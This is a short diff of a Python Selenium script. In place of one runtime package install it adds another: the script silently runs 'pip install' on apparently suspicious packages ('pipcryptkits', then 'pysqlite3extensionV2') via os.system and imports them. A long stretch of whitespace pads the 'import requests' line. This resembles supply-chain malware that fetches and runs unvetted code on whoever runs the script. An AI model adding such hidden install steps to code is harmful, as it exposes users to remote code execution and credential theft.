@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptkits")
-import pipcryptkits
+os.system("pip install pysqlite3extensionV2")
+import pysqlite3extensionV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
